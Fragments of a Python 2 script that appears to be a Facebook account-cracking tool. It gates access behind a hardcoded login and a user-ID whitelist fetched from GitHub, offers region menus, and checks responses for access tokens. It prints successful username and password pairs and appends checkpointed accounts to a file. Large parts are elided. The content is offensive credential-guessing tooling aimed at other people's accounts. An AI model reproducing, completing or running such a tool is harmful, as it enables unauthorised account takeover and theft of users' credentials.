...
def keluar():
    print 'Thanks.'
    os.sys.exit()
os.system('rm -rf list2.txt')
os.system('id -u > list2.txt')
uidd = open('list2.txt', 'r')
for j in uidd:
    sp = j.split()
...
def chk(): 
  ...
  print("\n\n\x1b[37;1mYour ID : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/GIMAING/Active_app/main/list2.txt").text 
    if id in httpCaht: 
...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            print '\x1b[1;92m[\xe2\x9c\x93] ok  ' + username
            time.sleep(3)
            loop = 'false'
        else:
            print 'Pass no'
...
def menu():
    ...
    print '\x1b[1;97m[2]\x1b[1;97m  Kurdistan'
    print '\x1b[1;97m[3]\x1b[1;97m  bi sutan \033[92m[No CP] \033[97m'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m---------------------------------------------------------\n'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;91m[SUCCESSFULL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
